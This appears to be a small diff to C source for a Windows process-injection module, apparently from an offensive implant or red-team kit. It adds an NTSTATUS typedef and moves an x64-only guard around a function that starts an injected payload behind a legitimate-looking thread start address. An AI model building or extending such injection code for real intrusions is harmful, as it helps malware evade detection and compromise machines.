@@ -26,6 +26,9 @@
 #include "bformat.h"
 #include "syscalls.h"
 
+#ifndef NTSTATUS
+typedef LONG NTSTATUS;
+#endif
 typedef NTSTATUS(NTAPI *fRtlCloneUserProcess)(ULONG, void *, HANDLE *, HANDLE *);
 typedef NTSTATUS(NTAPI *fNtQueryInformationProcess)(HANDLE, ULONG, void *, ULONG, ULONG *);
 
@@ -97,13 +100,13 @@ static void * remote_exe_entry_x64(HANDLE hProcess) {
 
 /* 4.11 ObfSetThreadContext: legit start address, payload via context */
 BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddress, LPVOID lpParameter) {
+#if !defined _M_X64
+	/* 4.11 constraint: same architecture, x64 only */
+	return FALSE;
+#else
 	HANDLE hThread = NULL;
 	void * legit = NULL;
 	CONTEXT c;
-
-#if !defined _M_X64
-	return FALSE;
-#endif
 
 	/* same architecture only (4.11 constraint) */
 	if (!context->sameArch) {
@@ -147,6 +150,7 @@ BOOL inject_via_obfsetthreadcontext(INJECTCONTEXT * context, LPVOID lpStartAddre
 	ResumeThread(hThread);
 	CloseHandle(hThread);
 	return TRUE;
+#endif
 }
 
 /* does the configured process-inject execute chain contain this opcode? */
